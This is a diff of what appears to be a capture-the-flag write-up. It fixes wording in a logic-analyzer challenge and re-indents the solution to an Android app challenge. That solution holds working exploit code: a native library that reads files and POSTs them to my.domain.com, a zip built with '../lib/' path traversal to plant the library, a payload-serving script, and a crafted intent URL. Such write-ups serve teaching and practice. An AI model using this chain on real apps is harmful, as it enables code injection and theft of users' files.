@@ -186,9 +186,9 @@ favoritesList=["SPI",null,"UART"]
 
 Okay this is definitely something that could be a snapshot of a serial port communication. The words `SPI` and `UART` very much hint at that. 
 
-There isn't any data in the 16 directories (a normal assumption is that those are 16 channels), except for directory 1 which contains two 1mb files filled mostly with 0s or 1s.
+There isn't any data in the 16 directories (a normal assumption is that those are 16 channels), except for directory 1 which contains two 1mb files filled mostly with 0 bytes or 0xFF bytes.
 
-Not trying to bang your head parsing it too much, the problem with these channels is that this is probably some logic analyzer sniffing a serial connection. You can assume a lot of things about the connection and try to parse it, but there are just so many different serial standards, as well as logic analyzers each probably saving the analysis under a different convention, your best bet is to simply find the software that knows how to parse it.
+Without trying to bang your head at parsing it, the problem with these challenges is that this is probably some logic analyzer sniffing a serial connection. You can assume a lot of things about the connection and try to parse it, but there are just so many different serial standards, as well as logic analyzers each probably saving the analysis under a different convention, your best bet is to simply find the software that knows how to parse it.
 
 Luckily, Googling `DL16 Plus` you quickly find that this tool belongs to Alientek and that they provide the tool (ATK-LogicViewer) for free which knows how to load `.atkdl` files. 
 
@@ -493,97 +493,99 @@ Anyway, what we need is:
 
 1. Use NDK to compile 4 versions (PIC for all possible ABIs - example for x86: `$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/i686-linux-android21-clang++ -shared -fPIC -O2 -std=c++17 imgcheck.cpp  -o libimgcheck_x86.so`) of a simple C++ file that exports a single `isValid` function:
 
-```cpp
-JNIEXPORT jboolean JNICALL
-Java_com_appsecil_imagegallery_ImgCheck_isValid(JNIEnv *env, jclass clazz, jstring jpath) {
-    const char *path = env->GetStringUTFChars(jpath, NULL);
-    
-    FILE *f = fopen(path, "rb");
-    if (f) {
-        fseek(f, 0, SEEK_END);
-        long size = ftell(f);
-        fseek(f, 0, SEEK_SET);
+    ```cpp
+    JNIEXPORT jboolean JNICALL
+    Java_com_appsecil_imagegallery_ImgCheck_isValid(JNIEnv *env, jclass clazz, jstring jpath) {
+        const char *path = env->GetStringUTFChars(jpath, NULL);
         
-        unsigned char *buffer = (unsigned char*)malloc(size);
-        size_t bytesRead = fread(buffer, 1, size, f);
-        fclose(f);
-        
-        char *encoded_data = base64_encode(buffer, bytesRead);
-        if (encoded_data != NULL) {
-            // Create socket
-            int sock = socket(AF_INET, SOCK_STREAM, 0);
-            if (sock >= 0) {
-                struct hostent *host = gethostbyname("my.domain.com");
-                if (host) {
-                    struct sockaddr_in server;
-                    memset(&server, 0, sizeof(server));
-                    server.sin_family = AF_INET;
-                    server.sin_port = htons(80);
-                    memcpy(&server.sin_addr.s_addr, host->h_addr, host->h_length);
-                    
-                    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
-                        const char *filename = strrchr(path, '/');
-                        filename = filename ? filename + 1 : path;
+        FILE *f = fopen(path, "rb");
+        if (f) {
+            fseek(f, 0, SEEK_END);
+            long size = ftell(f);
+            fseek(f, 0, SEEK_SET);
+            
+            unsigned char *buffer = (unsigned char*)malloc(size);
+            size_t bytesRead = fread(buffer, 1, size, f);
+            fclose(f);
+            
+            char *encoded_data = base64_encode(buffer, bytesRead);
+            if (encoded_data != NULL) {
+                // Create socket
+                int sock = socket(AF_INET, SOCK_STREAM, 0);
+                if (sock >= 0) {
+                    struct hostent *host = gethostbyname("my.domain.com");
+                    if (host) {
+                        struct sockaddr_in server;
+                        memset(&server, 0, sizeof(server));
+                        server.sin_family = AF_INET;
+                        server.sin_port = htons(80);
+                        memcpy(&server.sin_addr.s_addr, host->h_addr, host->h_length);
                         
-                        size_t encoded_length = strlen(encoded_data);
-                        char headers[2048];
-                        int headerLen = snprintf(headers, sizeof(headers),
-                            "POST /%s HTTP/1.1\r\n"
-                            "Host: my.domain.com\r\n"
-                            "Content-Type: text/plain\r\n"
-                            "Content-Length: %zu\r\n"
-                            "Connection: close\r\n\r\n",
-                            filename, encoded_length);
-                        
-                        if (headerLen > 0 && headerLen < sizeof(headers)) {
-                            send(sock, headers, headerLen, 0);
-                            send(sock, encoded_data, encoded_length, 0);
+                        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
+                            const char *filename = strrchr(path, '/');
+                            filename = filename ? filename + 1 : path;
+                            
+                            size_t encoded_length = strlen(encoded_data);
+                            char headers[2048];
+                            int headerLen = snprintf(headers, sizeof(headers),
+                                "POST /%s HTTP/1.1\r\n"
+                                "Host: my.domain.com\r\n"
+                                "Content-Type: text/plain\r\n"
+                                "Content-Length: %zu\r\n"
+                                "Connection: close\r\n\r\n",
+                                filename, encoded_length);
+                            
+                            if (headerLen > 0 && headerLen < sizeof(headers)) {
+                                send(sock, headers, headerLen, 0);
+                                send(sock, encoded_data, encoded_length, 0);
+                            }
                         }
+                        close(sock);
                     }
-                    close(sock);
                 }
+                free(encoded_data);
             }
-            free(encoded_data);
+            
+            free(buffer);
         }
         
-        free(buffer);
+        env->ReleaseStringUTFChars(jpath, path);
+        return JNI_TRUE;
     }
-    
-    env->ReleaseStringUTFChars(jpath, path);
-    return JNI_TRUE;
-}
-``` 
+    ``` 
 2. Put the compiled shared libraries into a zip file with traversal one directory up (so they land inside the `files/lib/` directory):
-```py
-import zipfile
 
-with zipfile.ZipFile('malicious.zip', 'w', zipfile.ZIP_DEFLATED) as zf:
-    architectures = [
-        ('x86', 'libimgcheck_x86.so'),
-        ('x86_64', 'libimgcheck_x86_64.so'),
-        ('armeabi-v7a', 'libimgcheck_arm.so'),
-        ('arm64-v8a', 'libimgcheck_arm64.so')
-    ]
-    
-    for arch, filename in architectures:
-        with open(filename, 'rb') as f:
-            zip_path = f'../lib/{arch}/libimgcheck.so'
-            zf.writestr(zip_path, f.read())
-```
+    ```py
+    import zipfile
+
+    with zipfile.ZipFile('malicious.zip', 'w', zipfile.ZIP_DEFLATED) as zf:
+        architectures = [
+            ('x86', 'libimgcheck_x86.so'),
+            ('x86_64', 'libimgcheck_x86_64.so'),
+            ('armeabi-v7a', 'libimgcheck_arm.so'),
+            ('arm64-v8a', 'libimgcheck_arm64.so')
+        ]
+        
+        for arch, filename in architectures:
+            with open(filename, 'rb') as f:
+                zip_path = f'../lib/{arch}/libimgcheck.so'
+                zf.writestr(zip_path, f.read())
+    ```
 3. Serve the `malicious.zip` on a publicly available URL. I have my own server so I just ran a simple script to do so:
-```py
-# ...
-@app.route("/", defaults={"path": ""})
-@app.route("/<path:path>")
-def handle_request(path):
-    return send_file(
-        ZIP_FILE_PATH,
-        mimetype='application/zip',
-        as_attachment=True,
-        download_name='data.zip'
-    )
-# ...
-```
+
+    ```py
+    # ...
+    @app.route("/", defaults={"path": ""})
+    @app.route("/<path:path>")
+    def handle_request(path):
+        return send_file(
+            ZIP_FILE_PATH,
+            mimetype='application/zip',
+            as_attachment=True,
+            download_name='data.zip'
+        )
+    # ...
+    ```
 4. Send the following intent to the remote machine: `appsecil://localhost?url=intent://host%23Intent%3Bcomponent%3Dcom.appsecil.imagegallery/.ZipGalleryActivity%3BS.url%3Dhttps://dev.taltechtreks.com/payload.zip%3Bend`. Removing the URL decode on the `url` parameter, it is actually: `intent://host#Intent;component=com.appsecil.imagegallery/.ZipGalleryActivity;S.url=https://my.domain.com/payload.zip;end`. 
 
 So what will actually happen on the remote machine:
